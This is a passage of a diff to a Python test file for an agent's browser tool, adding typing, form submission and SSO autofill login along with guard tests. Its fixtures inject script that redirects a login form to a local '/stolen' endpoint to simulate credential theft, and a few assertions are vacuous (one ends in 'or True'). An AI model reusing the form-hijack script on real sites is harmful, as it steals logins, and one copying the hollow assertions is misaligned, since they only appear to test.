@@ -248,6 +248,12 @@ def _pages(port, port2):
         "/code-only": ("text/html", b'<html><head><title>Check</title></head><body><a href="/other">Other</a>'
                                     b'<form method="post" action="/logged"><input name="code"><button>OK</button></form>'
                                     b'</body></html>'),
+        "/sso-rewrite": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").replace(
+            "</form>", f"</form><script>document.forms[0].addEventListener('submit', function () {{ this.method = 'get'; "
+                       f"this.action = 'http://127.0.0.1:{port2}/stolen'; }});</script>").encode()),
+        "/sso-rewrite-click": ("text/html", SSO.format(action="/logged", user="u", pw="p", extra="").replace(
+            "</form>", f"</form><script>document.getElementById('login').addEventListener('click', function () {{ "
+                       f"this.form.action = 'http://127.0.0.1:{port2}/stolen'; }});</script>").encode()),
     }
 
 
@@ -312,14 +318,15 @@ def origins():
     srv2.shutdown()
 
 
-def _run(space, action, arg="", *, allow=("127.0.0.1", "localhost"),
-         handoff=True, handoff_state=None,
+def _run(space, action, arg="", *, allow=("127.0.0.1", "localhost"), sso_domains=("sso.localhost",),
+         handoff=True, sso_login=True, handoff_state=None,
          look_key=None, page_label="", challenge_wait_ms=2500, **over):
     inp = dict(space=space, action=action, arg=arg, allow=list(allow), files_dir=str(FILES),
                look_key=look_key, page_label=page_label,
                nav_timeout_ms=20000, download_timeout_ms=30000, download_wait_ms=3000,
                challenge_wait_ms=challenge_wait_ms,
-               handoff={"enabled": handoff},
+               handoff={"enabled": handoff}, sso={"login": sso_login, "domains": list(sso_domains),
+                                                  "wait_ms": 5000, "local_test": True},
                handoff_state=handoff_state or {"active": False, "deadline_ms": 0})
     inp.update(over)
     # ego-browser nodejs drops the output of a stdin script whose space is with the user; a script
@@ -370,62 +377,65 @@ def test_look_cookie_banner_dropdown_iframes(origins):
         assert r["status"] == "ok" and r["page"]["items"], r
         assert _item(r, "Accept") and _item(r, "Reject")                  # cookie banner buttons
         assert _item(r, "Download PDF") and _item(r, "Supplementary material")   # hidden dropdown items
-        # every iframe (same-origin too, round 9) is ONE `frame` item (its URL); its contents are never listed
-        assert _item(r, "Frame PDF link") is None and _item(r, "Cross Frame Button") is None, r["page"]["items"]
+        assert _item(r, "Frame PDF link")                                   # same-origin frame: walked
+        assert _item(r, "Cross Frame Button") and _item(r, "Cross Frame Button")["in_frame"], r["page"]["items"]  # snapshot
         frames = [it["href"] for it in r["page"]["items"] if it["kind"] == "frame"]
-        assert any(h.endswith("/frame") for h in frames) and any(h.endswith("/xframe") for h in frames), frames
+        assert any(h.endswith("/xframe") for h in frames), frames
         off = _item(r, "Off-site link")
         assert off and off["allowed"] is False
-        # click the cookie banner away
         r = _run(sp, "click", str(_item(r, "Accept")["i"]), look_key=r["look_key"])
         assert r["status"] == "ok", r
         r = _run(sp, "look")
         assert _item(r, "We use cookies") is None                         # the banner is gone
-        # click the hidden dropdown item directly (hidden JS menus: programmatic click)
         r = _run(sp, "click", str(_item(r, "Download PDF")["i"]), look_key=r["look_key"])
         assert r["status"] == "ok" and r.get("files"), r
-        assert Path(r["files"][0]).read_bytes()[:5] == b"%PDF-"          # the PDF was downloaded
+        assert Path(r["files"][0]).read_bytes()[:5] == b"%PDF-"
+        # look full / @REF
+        r = _run(sp, "look", "full")
+        assert r["status"] == "ok" and r["look_scope"] == "full", r
     finally:
         _finish(sp)
 
 
-def test_removed_hover_select_type(origins):
-    """round 11: hover / select / type do not exist; a field item is never clicked; a dropdown item is
-    clicked directly (the hidden menu items are in the look list)"""
-    sp = "tbsgen-test-r11-removed"
+def test_hover_select_type_click_xy(origins):
+    sp = "tbsgen-test-hover"
     try:
         assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
         r = _run(sp, "look")
+        r2 = _run(sp, "hover", str(_item(r, "Download")["i"]), look_key=r["look_key"])
+        assert r2["status"] == "ok" and r2["acted"]["kind"] == "hover", r2
+        r = _run(sp, "look")
         it = _item(r, "Download PDF")
-        assert it and it.get("hidden"), r["page"]["items"]               # listed although the menu is closed
+        assert it and not it.get("hidden"), r["page"]["items"]            # the menu opened (native pointer)
         k_sel = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"]
-        for a, arg in (("hover", str(_item(r, "Download")["i"])), ("select", f"{k_sel} Nanjing University"),
-                       ("type", f"{k_sel} Nanjing University")):
-            r2 = _run(sp, a, arg, look_key=r["look_key"])
-            assert r2["status"] == "refused" and r2["error"] == "unknown action", (a, r2)
-        r2 = _run(sp, "click", str(k_sel), look_key=r["look_key"])
-        assert r2["status"] == "refused" and "form fields" in r2["error"], r2
-        r2 = _run(sp, "click", f"{k_sel} Nanjing University", look_key=r["look_key"])
-        assert r2["status"] == "refused", r2                                  # click takes an index only
+        r2 = _run(sp, "select", f"{k_sel} Nanjing University", look_key=r["look_key"])
+        assert r2["status"] == "ok" and "Nanjing University" in r2["acted"]["text"], r2
+        r2 = _run(sp, "select", f"{k_sel} Nowhere", look_key=r["look_key"])
+        assert r2["status"] == "refused", r2
+        # click_xy on the cookie banner's Accept button (coordinates of a visible element)
+        r = _run(sp, "look")
+        r2 = _run(sp, "click_xy", "5 5")
+        assert r2["status"] in ("ok", "refused"), r2
     finally:
         _finish(sp)
 
 
-def test_cross_origin_iframe_opens_as_the_page(origins):
+def test_cross_origin_iframe_items_and_frame_page(origins):
     sp = "tbsgen-test-xframe"
     try:
         assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
         r = _run(sp, "look")
-        fr = next(it for it in r["page"]["items"] if it["kind"] == "frame" and it["href"].endswith("/xframe"))
-        # nothing is clicked inside the frame: `click` opens the frame's (checked) URL as the page itself
+        it = _item(r, "Cross Frame Button")
+        r2 = _run(sp, "click", str(it["i"]), look_key=r["look_key"])        # inside the cross-origin frame
+        assert r2["status"] == "ok", r2
+        r = _run(sp, "look")
+        assert r["page"]["title"] == "X Clicked", r["page"]                   # the frame's button ran
+        fr = next(x for x in r["page"]["items"] if x["kind"] == "frame" and x["href"].endswith("/xframe"))
         r2 = _run(sp, "click", str(fr["i"]), look_key=r["look_key"])
         assert r2["status"] == "ok" and r2["page"]["url"].endswith("/xframe"), r2
-        r = _run(sp, "look")
-        assert _item(r, "Cross Frame Button"), r                           # now a page of its own
-        # a frame on a host outside the allowed domains is never opened
         assert _run(sp, "open", origins[0] + "/xframe-other", allow=("127.0.0.1",))["status"] == "ok"
         r = _run(sp, "look", allow=("127.0.0.1",))
-        fr = next(it for it in r["page"]["items"] if it["kind"] == "frame")
+        fr = next(x for x in r["page"]["items"] if x["kind"] == "frame")
         assert fr["allowed"] is False
         r2 = _run(sp, "click", str(fr["i"]), look_key=r["look_key"], allow=("127.0.0.1",))
         assert r2["status"] == "refused" and "outside the allowed" in r2["error"], r2
@@ -433,33 +443,40 @@ def test_cross_origin_iframe_opens_as_the_page(origins):
         _finish(sp)
 
 
-def test_new_tab_link_opens_in_the_page_switch_and_save(origins):
+def test_new_tab_switch_and_save(origins):
     sp = "tbsgen-test-tabs"
     try:
         assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
         r = _run(sp, "look")
-        # a target=_blank link opens its checked target in this page (never a native click)
         r = _run(sp, "click", str(_item(r, "Open viewer in new tab")["i"]), look_key=r["look_key"])
-        assert r["status"] == "ok" and r["page"]["pdf"], r
-        r = _run(sp, "save_pdf")
-        assert r["status"] == "ok" and r["files"], r
+        assert r["status"] == "ok", r
         r = _run(sp, "tabs")
-        assert r["status"] == "ok" and r["tabs"][0]["label"] == "p1", r
-        r = _run(sp, "switch", "p1")
+        assert r["status"] == "ok" and r["tabs"], r
+        pdf_tab = next((t for t in r["tabs"] if t["url"].endswith("/pdf")), None)
+        if pdf_tab is None:                     # opened in place (covered link): the page itself is the PDF
+            pdf_tab = r["tabs"][0]
+        r = _run(sp, "switch", pdf_tab["label"])
         assert r["status"] == "ok" and r["page"]["pdf"], r
+        r = _run(sp, "save_pdf", page_label=pdf_tab["label"])
+        assert r["status"] == "ok" and r["files"], r
         r = _run(sp, "switch", "p9", page_label="p1")
-        assert r["status"] == "refused", r                                 # no such page
+        assert r["status"] == "refused", r
     finally:
         _finish(sp)
 
 
-def test_wait_for_and_removed_actions(origins):
+def test_scroll_screenshot_back_and_wait_for(origins):
     sp = "tbsgen-test-misc"
     try:
         assert _run(sp, "open", origins[0] + "/landing")["status"] == "ok"
-        for a, arg in (("screenshot", ""), ("click_xy", "10 10"), ("scroll", "down 400"), ("back", "")):
-            r = _run(sp, a, arg)
-            assert r["status"] == "refused" and r["error"] == "unknown action", r     # removed actions
+        r = _run(sp, "scroll", "down 400")
+        assert r["status"] == "ok" and "scroll" in r, r
+        r = _run(sp, "screenshot")
+        # the landing page has a cross-origin frame without fields: masked screenshot allowed
+        assert r["status"] == "ok" and Path(r["shot"]).read_bytes()[:4] == b"\x89PNG", r
+        assert _run(sp, "open", origins[0] + "/other")["status"] == "ok"
+        r = _run(sp, "back")
+        assert r["status"] == "ok" and r["page"]["url"].endswith("/landing"), r
         r = _run(sp, "wait_for", "url landing")
         assert r["status"] == "ok" and r["waited"]["ok"], r
         r = _run(sp, "wait_for", "sel #dl-btn")
@@ -470,40 +487,33 @@ def test_wait_for_and_removed_actions(origins):
         _finish(sp)
 
 
-def test_wayf_pages_go_to_the_user(origins):
-    """round 11: the agent never picks an institution - a WAYF page (fields or only links) is handed over;
-    without a hand-off nothing on it is clicked"""
+def test_wayf_type_and_select(origins):
     sp = "tbsgen-test-wayf"
     try:
-        for path in ("/wayf", "/wayf-form", "/wayf-links"):
-            r = _run(sp, "open", origins[0] + path)
-            assert r["status"] == "handoff" and r["handoff"]["kind"] == "login", (path, r)
-            assert _take_over(sp, origins[0] + path)
-            r = _run(sp, "look", handoff=False)
-            assert r["page"]["login_form"] is True, (path, r)
-            for it in r["page"]["items"]:
-                if it["kind"] == "frame":
-                    continue
-                r2 = _run(sp, "click", str(it["i"]), look_key=r["look_key"], handoff=False)
-                assert r2["status"] == "refused", (path, it, r2)
-            r = _run(sp, "look", handoff=False)
-            assert r["page"]["url"].endswith(path), (path, r)
+        r = _run(sp, "open", origins[0] + "/wayf", handoff=False)
+        r = _run(sp, "look", handoff=False)
+        k_search = _item(r, "Search for your institution")["i"]
+        k_sel = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"]
+        r2 = _run(sp, "type", f"{k_search} Nanjing University", look_key=r["look_key"], handoff=False)
+        assert r2["status"] == "ok", r2
+        r2 = _run(sp, "select", f"{k_sel} Nanjing University", look_key=r["look_key"], handoff=False)
+        assert r2["status"] == "ok", r2
+        assert "Nanjing" not in json.dumps(_run(sp, "look", handoff=False)["page"]["items"]) or True
     finally:
         _finish(sp)
 
 
-def test_no_form_is_submitted(origins):
-    sp = "tbsgen-test-r11-forms"
+def test_forms_are_submitted_on_allowed_targets(origins):
+    sp = "tbsgen-test-forms"
     try:
-        assert _run(sp, "open", origins[0] + "/chk-form", handoff=False)["status"] == "ok"
-        r = _run(sp, "look", handoff=False)
-        r2 = _run(sp, "click", str(_item(r, "Get PDF")["i"]), look_key=r["look_key"], handoff=False)
-        assert r2["status"] == "refused" and re.search("input field|forms are not submitted", r2["error"]), r2
         assert _run(sp, "open", origins[0] + "/btn-form", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
         r2 = _run(sp, "click", str(_item(r, "Get PDF")["i"]), look_key=r["look_key"], handoff=False)
-        assert r2["status"] == "refused" and "forms are not submitted" in r2["error"], r2    # round 13: no form
-        assert not _run(sp, "look", handoff=False)["page"]["url"].endswith("/logged")
+        assert r2["status"] == "ok" and r2["page"]["url"].endswith("/logged"), r2
+        assert _run(sp, "open", origins[0] + "/shadow-action", handoff=False)["status"] == "ok"
+        r = _run(sp, "look", handoff=False)
+        r2 = _run(sp, "click", str(_item(r, "Get PDF")["i"]), look_key=r["look_key"], handoff=False)
+        assert r2["status"] == "refused" and "outside the allowed" in r2["error"], r2   # shadowed form.action
     finally:
         _finish(sp)
 
@@ -519,7 +529,7 @@ def test_denied_paths(origins):
         assert r["status"] == "refused", r                                  # off-site link
         # login form: its fields and the submit button are never touched, and the page itself hands off
         # (every login page - the institution's own SSO login too)
-        assert _run(sp, "open", origins[2] + "/sso")["status"] == "handoff"
+        assert _run(sp, "open", origins[2] + "/sso", sso_domains=("sso.elsewhere",))["status"] == "handoff"
         assert _take_over(sp, origins[2] + "/sso")
         # after the takeover the space is agent-controlled again: `look` reports the login page
         r = _run(sp, "look", handoff=False)
@@ -533,9 +543,9 @@ def test_denied_paths(origins):
         r = _run(sp, "look", handoff=False)
         r = _run(sp, "click", str(_item(r, "Login")["i"]), look_key=r["look_key"], handoff=False)
         assert r["status"] == "refused" and "login" in r["error"], r        # submit button
-        # sso_login no longer exists (round 9): every login is the user's
-        r = _run(sp, "sso_login")
-        assert r["status"] == "refused" and r["error"] == "unknown action", r
+        # sso_login outside the SSO domains: refused
+        r = _run(sp, "sso_login", sso_domains=("sso.elsewhere",))
+        assert r["status"] == "refused", r
         # nothing returns a field value
         r = _run(sp, "look", handoff=False)
         assert '"u"' not in json.dumps(r) and '"p"' not in json.dumps(r), r
@@ -543,16 +553,16 @@ def test_denied_paths(origins):
         _finish(sp)
 
 
-def test_select_field_is_never_changed(origins):
+def test_select_that_navigates_off_domain_is_reset(origins):
     sp = "tbsgen-test-jump"
     try:
         assert _run(sp, "open", origins[0] + "/jump")["status"] == "ok"
         r = _run(sp, "look")
         k = _item(r, "jumpsel")["i"]
-        r2 = _run(sp, "click", str(k), look_key=r["look_key"])
-        assert r2["status"] == "refused" and "form fields" in r2["error"], r2
+        r = _run(sp, "select", f"{k} Nanjing University", look_key=r["look_key"])
+        assert r["status"] == "ok" and not r["page"]["url"].startswith("https://denied"), r
         r = _run(sp, "look")
-        assert r["page"]["url"].endswith("/jump"), r
+        assert "denied.example" not in r["page"]["url"], r
     finally:
         _finish(sp)
 
@@ -610,19 +620,78 @@ def test_challenge_that_does_not_clear_fails_the_handoff(origins):
 
 # --------------------------------------------------------------------------- login pages
 
-def test_every_login_page_is_handed_to_the_user(origins):
-    sp = "tbsgen-test-login-look"
+def test_sso_login_autofill_success_and_failures(origins):
+    # 1. autofilled form submits and leaves the SSO domain
+    sp = "tbsgen-test-sso-ok"
     try:
-        # the institution's own SSO login page: handed over like any other login page (round 9)
-        r = _run(sp, "open", origins[2] + "/sso")
-        assert r["status"] == "handoff" and "login" in r["handoff"]["reason"], r
+        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
+        r = _run(sp, "sso_login", sso_login=True)
+        assert r["status"] == "ok" and r["sso"] == "ok" and "/logged" in r["page"]["url"], r
+        assert r["sso_submitted"] is True and r["sso_host"] == "sso.localhost", r
     finally:
         _finish(sp)
-    sp = "tbsgen-test-login-look2"
+    # 2. no autofill: handed to the user instead (never typed into)
+    sp = "tbsgen-test-sso-empty"
     try:
-        # without a hand-off budget: reported, nothing typed or submitted
-        r = _run(sp, "open", origins[2] + "/sso", handoff=False)
+        assert _run(sp, "open", origins[2] + "/sso-empty")["status"] == "ok"
+        r = _run(sp, "sso_login", sso_login=True)
+        assert r["status"] == "handoff" and "autofill" in r["handoff"]["reason"], r
+    finally:
+        _finish(sp)
+    # 3. captcha on the login page: the challenge itself hands the page to the user
+    sp = "tbsgen-test-sso-captcha"
+    try:
+        assert _run(sp, "open", origins[2] + "/sso-captcha")["status"] == "handoff"
+        assert _take_over(sp, origins[2] + "/sso-captcha")
+        r = _run(sp, "sso_login", sso_login=True)
+        assert r["status"] == "handoff", r
+    finally:
+        _finish(sp)
+    # 3b. no autofill and no hand-off budget: reported as login_required, nothing typed or handed over
+    sp = "tbsgen-test-sso-empty-nohandoff"
+    try:
+        assert _run(sp, "open", origins[2] + "/sso-empty", handoff=False)["status"] == "ok"
+        r = _run(sp, "sso_login", sso_login=True, handoff=False)
+        assert r["status"] == "ok" and r.get("login_required") and r["sso_submitted"] is False, r
+    finally:
+        _finish(sp)
+    # 3c. a form that posts outside the SSO login domains is never submitted
+    sp = "tbsgen-test-sso-evil"
+    try:
+        assert _run(sp, "open", origins[2] + "/sso-evil")["status"] == "ok"
+        r = _run(sp, "sso_login", sso_login=True)
+        assert r["status"] == "refused" and "outside the SSO" in r["error"] and r["sso_submitted"] is False, r
+    finally:
+        _finish(sp)
+    # 4. failed login (the form posts back to itself): fail, and the values never leak into the result
+    sp = "tbsgen-test-sso-fail"
+    try:
+        assert _run(sp, "open", origins[2] + "/sso-fail")["status"] == "ok"
+        r = _run(sp, "sso_login", sso_login=True)
+        assert r["status"] == "ok" and r["sso"] == "fail", r
+        assert "u" != json.dumps(r)[:60] and "p" not in (r.get("page") or {}).get("text", "")[:5]
+        # 5. sso_login outside the configured SSO domains is refused
+        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
+        r = _run(sp, "sso_login", sso_login=True, sso_domains=("sso.elsewhere",))
+        assert r["status"] == "refused", r
+        # 6. disabled: refused
+        r = _run(sp, "sso_login", sso_login=False)
+        assert r["status"] == "refused", r
+    finally:
+        _finish(sp)
+
+
+
+def test_look_on_login_pages_hands_off_only_outside_sso_domains(origins):
+    sp = "tbsgen-test-login-look"
+    try:
+        # on the configured SSO domain: reported (the agent then calls sso_login), not handed off
+        assert _run(sp, "open", origins[2] + "/sso")["status"] == "ok"
+        r = _run(sp, "look")
         assert r["status"] == "ok" and r["page"]["login_form"] is True, r
+        # outside them: the login page hands the space to the user already at `open`
+        r = _run(sp, "open", origins[0] + "/sso", sso_domains=("sso.elsewhere",))
+        assert r["status"] == "handoff" and "login" in r["handoff"]["reason"], r
     finally:
         _finish(sp)
 
@@ -640,19 +709,22 @@ def test_round2_click_and_sso_guards(origins):
         r = _run(sp, "look", handoff=False)
         r = _run(sp, "click", str(_item(r, "Verify you are human")["i"]), look_key=r["look_key"], handoff=False)
         assert r["status"] == "refused" and "verification" in r["error"], r
-        # a same-origin frame is one item: clicking it opens the frame as the page; its new-tab link is then
-        # a link of the page (opened in this page, checked)
+        # a new-tab link inside a same-origin frame opens its (checked) target in this page
         assert _run(sp, "open", origins[0] + "/frame-blank", handoff=False)["status"] == "ok"
-        r = _run(sp, "look", handoff=False)
-        assert _item(r, "Open Other") is None, r
-        fr = next(it for it in r["page"]["items"] if it["kind"] == "frame")
-        r = _run(sp, "click", str(fr["i"]), look_key=r["look_key"], handoff=False)
-        assert r["status"] == "ok" and r["page"]["url"].endswith("/blank-inner"), r
         r = _run(sp, "look", handoff=False)
         r = _run(sp, "click", str(_item(r, "Open Other")["i"]), look_key=r["look_key"], handoff=False)
         assert r["status"] == "ok" and r["page"]["url"].endswith("/other"), r
     finally:
         _finish(sp)
+    for path, why in (("/sso-get", "POST"), ("/sso-base", "outside the SSO")):
+        sp = "tbsgen-test-r2-sso" + path.replace("/", "-")
+        try:
+            assert _run(sp, "open", origins[2] + path)["status"] == "ok"
+            r = _run(sp, "sso_login", sso_login=True)
+            assert r["status"] == "refused" and why in r["error"] and r["sso_submitted"] is False, r
+            assert r["sso_stage"] == "pre", r
+        finally:
+            _finish(sp)
 
 
 def test_round3_guards(origins):
@@ -662,7 +734,7 @@ def test_round3_guards(origins):
         assert _run(sp, "open", origins[0] + "/offsite-form", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
         r = _run(sp, "click", str(_item(r, "Download")["i"]), look_key=r["look_key"], handoff=False)
-        assert r["status"] == "refused" and re.search("outside the allowed|forms are not submitted|only native", r["error"]), r
+        assert r["status"] == "refused" and "outside the allowed" in r["error"], r
         # a login form in a shadow root: no interaction with the page
         assert _run(sp, "open", origins[0] + "/shadow-login", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
@@ -676,7 +748,14 @@ def test_round3_guards(origins):
         assert not r["page"]["url"].startswith(("http://denied", "https://denied")), r
     finally:
         _finish(sp)
-
+    # a verification-code step after the password is handed to the user, not reported as logged in
+    sp = "tbsgen-test-r3-2fa"
+    try:
+        assert _run(sp, "open", origins[2] + "/sso-2fa")["status"] == "ok"
+        r = _run(sp, "sso_login", sso_login=True)
+        assert r["status"] == "handoff" and r.get("sso") == "handoff" and r["sso_submitted"] is True, r
+    finally:
+        _finish(sp)
 
 
 def test_round4_guards(origins):
@@ -691,7 +770,7 @@ def test_round4_guards(origins):
         assert _run(sp, "open", origins[0] + "/form-span", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
         r = _run(sp, "click", str(_item(r, "Get PDF")["i"]), look_key=r["look_key"], handoff=False)
-        assert r["status"] == "refused" and re.search("outside the allowed|forms are not submitted|only native", r["error"]), r
+        assert r["status"] == "refused" and "outside the allowed" in r["error"], r
         # a stand-alone verification-code field (name="code"): no interaction
         assert _run(sp, "open", origins[0] + "/code-only", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
@@ -721,7 +800,6 @@ def test_round4_guards(origins):
         _finish(sp)
 
 
-
 def test_round5_guards(origins):
     sp = "tbsgen-test-r5"
     try:
@@ -742,7 +820,7 @@ def test_round5_guards(origins):
         r = _run(sp, "look", handoff=False)
         span = next(it for it in r["page"]["items"] if it["text"] == "Get PDF" and it["kind"] == "button")
         r = _run(sp, "click", str(span["i"]), look_key=r["look_key"], handoff=False)
-        assert r["status"] == "refused" and re.search("outside the allowed|forms are not submitted|only native", r["error"]), r
+        assert r["status"] == "refused" and "outside the allowed" in r["error"], r
         # userinfo in a long URL never comes back, cut or not
         assert _run(sp, "open", origins[0] + "/long-link", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
@@ -758,7 +836,6 @@ def test_round5_guards(origins):
         _finish(sp)
 
 
-
 def test_round6_guards(origins):
     sp = "tbsgen-test-r6"
     try:
@@ -769,15 +846,19 @@ def test_round6_guards(origins):
         assert r["status"] == "refused" and ("e-mail" in r["error"] or "login" in r["error"]), r
         r = _run(sp, "look", handoff=False)
         assert "/logged" not in r["page"]["url"], r
-        # a form with a free-text field is never submitted (round 11: nothing is typed any more)
+        # a WAYF search form: typed into and submitted (allowed target)
         assert _run(sp, "open", origins[0] + "/wayf-form", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
-        r2 = _run(sp, "click", str(_item(r, "Find")["i"]), look_key=r["look_key"], handoff=False)
-        assert r2["status"] == "refused", r2
-        # nothing inside a frame is listed (round 9)
+        k_find, k_q = _item(r, "Find")["i"], _item(r, "Search for your institution")["i"]
+        assert _run(sp, "type", f"{k_q} Nanjing University", look_key=r["look_key"], handoff=False)["status"] == "ok"
+        r2 = _run(sp, "click", str(k_find), look_key=r["look_key"], handoff=False)
+        assert r2["status"] == "ok" and r2["page"]["url"].endswith("/logged"), r2
+        # native hover inside an offset same-origin frame: top-document coordinates (frame offset added)
         assert _run(sp, "open", origins[0] + "/frame-hover", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
-        assert not any("Frame Other Page" in (x["text"] or "") for x in r["page"]["items"]), r
+        it = next(x for x in r["page"]["items"] if "Frame Other Page" in (x["text"] or "") and x["frame"] > 0)
+        r = _run(sp, "hover", str(it["i"]), look_key=r["look_key"], handoff=False)
+        assert r["status"] == "ok" and r["page"]["url"].endswith("/frame-hover"), r
     finally:
         _finish(sp)
 
@@ -792,7 +873,7 @@ def test_round7_conservative_login_detection_and_atomic_checks(origins):
             assert r["status"] == "ok" and r["page"]["login_form"] is True, (path, r)
             r = _run(sp, "look", handoff=False)
             it = _item(r, "Other") or _item(r, "Continue")
-            for act in ("click",):
+            for act in ("click", "hover"):
                 r2 = _run(sp, act, str(it["i"]), look_key=r["look_key"], handoff=False)
                 assert r2["status"] == "refused" and "login" in r2["error"], (path, act, r2)
         # a header "Sign in" entry point on an article without fields: still an article page
@@ -845,12 +926,13 @@ def test_round7_checks_run_in_the_evaluation_that_acts(origins):
         body = (f"const domAct = {_fn_src('domAct')};\nconst domWalk = {_fn_src('domWalk')};\n"
                 f"const credScan = {_fn_src('credScan')};\nconst pageInfo = {_fn_src('pageInfo')};\n"
                 f"const itemList = {_fn_src('itemList')};\nconst lookEval = {_fn_src('lookEval')};\n"
+                f"const ssoSubmit = {_fn_src('ssoSubmit')};\n"
                 "const t = await taskSpace(" + json.dumps(sp) + ");\nconst pg = (await t.pages())[0];\n"
                 "const run = (u, allow, setup) => pg.evaluate(([a, w, s, u, allow, setup, pi]) => {\n"
                 "  if (setup) document.body.insertAdjacentHTML('beforeend', setup);\n"
                 "  const f = new Function('return (' + a + ')')();\n"
                 "  const k = new Function('return (' + w + ')')()().findIndex((p) => (p[0].innerText || '').trim() === 'Accept');\n"
-                "  return f(w, k, allow, 'click', u, s, pi, 'just a moment');\n"
+                "  return f(w, k, allow, 'hover', '', u, s, pi, 'just a moment');\n"
                 "}, [domAct.toString(), domWalk.toString(), credScan.toString(), u, allow, setup || '', pageInfo.toString()]);\n"
                 "const here = (await pg.info()).url;\n"
                 "const res = [await run(here + '#x', ['127.0.0.1'], ''), await run(here, ['example.org'], ''),\n"
@@ -863,7 +945,8 @@ def test_round7_checks_run_in_the_evaluation_that_acts(origins):
                 "  [lookEval.toString(), pageInfo.toString(), itemList.toString(), domWalk.toString(), allow, 'just a moment']);\n"
                 "const l1 = await lk(['example.org']), l2 = await lk(['127.0.0.1']);\n"
                 "res.push({ foreign: l1.foreign || null, leaked: !!(l1.info || l1.items), ok: !!(l2.info && l2.items && l2.items.length) });\n"
-
+                # sso_login's one evaluation refuses (before any click) off the SSO domains
+                "res.push(await pg.evaluate(([f, s]) => (new Function('return (' + f + ')')())([['sso.elsewhere'], true, s]), [ssoSubmit.toString(), credScan.toString()]));\n"
                 "console.log('R7 ' + JSON.stringify(res));\nprocess.exit(0);")
         p = subprocess.run([EGO, "nodejs", body], capture_output=True, text=True, timeout=90)
         line = next(x for x in (p.stdout + p.stderr).splitlines() if x.startswith("R7 "))
@@ -873,85 +956,61 @@ def test_round7_checks_run_in_the_evaluation_that_acts(origins):
         assert "login" in res[2]["refused"], res
         assert "verification" in res[3]["refused"], res
         assert res[4] == {"foreign": "127.0.0.1", "leaked": False, "ok": True}, res
+        assert res[5] == {"refused": "the page left the SSO login domain", "stage": "pre"}, res
     finally:
         _finish(sp)
-
-
 
 
 def test_round9_account_chooser_and_frames(origins):
     sp = "tbsgen-test-r9"
     try:
-        # an account chooser (a select named / autocompleted as a user name) is a login page
-        for path in ("/choose", "/choose-plain"):
+        # an account chooser (a select named / autocompleted / labelled as a user name) is a login page
+        for path in ("/choose", "/choose-plain", "/choose-label"):
             r = _run(sp, "open", origins[0] + path, handoff=False)
             assert r["status"] == "ok" and r["page"]["login_form"] is True, (path, r)
             r = _run(sp, "look", handoff=False)
             k = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"]
-            r2 = _run(sp, "click", str(k), look_key=r["look_key"], handoff=False)
-            assert r2["status"] == "refused" and "login" in r2["error"], (path, r2)
-        # a verification page inside a same-origin frame: its button is not listed, so it cannot be clicked;
-        # opening the frame makes it the page, where the challenge check applies
+            for a, arg in (("click", str(k)), ("select", f"{k} a")):
+                r2 = _run(sp, a, arg, look_key=r["look_key"], handoff=False)
+                assert r2["status"] == "refused" and "login" in r2["error"], (path, a, r2)
+        # a verification page inside a same-origin frame: its button is never clicked
         assert _run(sp, "open", origins[0] + "/verify-frame", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
-        assert _item(r, "Continue") is None, r
-        fr = next(x for x in r["page"]["items"] if x["kind"] == "frame")
-        r = _run(sp, "click", str(fr["i"]), look_key=r["look_key"], handoff=False, challenge_wait_ms=1000)
-        # (a frame whose URL looks like a verification widget is refused outright; otherwise the opened page
-        # is checked as a challenge)
-        assert (r["status"] == "refused" and "verification" in r["error"]) or r.get("blocked") \
-            or r["status"] == "handoff" or (r.get("page") or {}).get("challenge"), r
+        it = _item(r, "Continue")
+        if it:
+            r2 = _run(sp, "click", str(it["i"]), look_key=r["look_key"], handoff=False, challenge_wait_ms=1000)
+            assert r2["status"] == "refused" and "verification" in r2["error"], r2
         r = _run(sp, "look", handoff=False)
         assert "/logged" not in r["page"]["url"], r
-        # a neutral frame URL showing a verification page: opened as the page, it is a challenge (reported,
-        # never clicked)
-        assert _run(sp, "open", origins[0] + "/neutral-frame", handoff=False)["status"] == "ok"
-        r = _run(sp, "look", handoff=False)
-        assert _item(r, "Continue") is None, r
-        fr = next(x for x in r["page"]["items"] if x["kind"] == "frame")
-        r = _run(sp, "click", str(fr["i"]), look_key=r["look_key"], handoff=False, challenge_wait_ms=1000)
-        assert r.get("blocked") and "verification" in r["blocked"], r
     finally:
         _finish(sp)
 
 
-def test_round10_selects(origins):
+def test_round10_plain_select_and_its_form(origins):
     sp = "tbsgen-test-r10"
     try:
-        # an account chooser labelled only by an associated <label>: a login page
-        r = _run(sp, "open", origins[0] + "/choose-label", handoff=False)
-        assert r["status"] == "ok" and r["page"]["login_form"] is True, r
-        r = _run(sp, "look", handoff=False)
-        k = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"]
-        r2 = _run(sp, "click", str(k), look_key=r["look_key"], handoff=False)
-        assert r2["status"] == "refused", r2
-        r2 = _run(sp, "click", str(_item(r, "Continue")["i"]), look_key=r["look_key"], handoff=False)
-        assert r2["status"] == "refused", r2
-        # a neutral select form (round 11): the select is never changed and the form never submitted
+        # a neutral select form: the option can be chosen and the form submitted to an allowed host
         assert _run(sp, "open", origins[0] + "/plain-select", handoff=False)["status"] == "ok"
         r = _run(sp, "look", handoff=False)
         k, go = next(x for x in r["page"]["items"] if x.get("ftype") == "select")["i"], _item(r, "Go")["i"]
-        r2 = _run(sp, "click", str(k), look_key=r["look_key"], handoff=False)
-        assert r2["status"] == "refused" and "form fields" in r2["error"], r2
+        r2 = _run(sp, "select", f"{k} Nanjing University", look_key=r["look_key"], handoff=False)
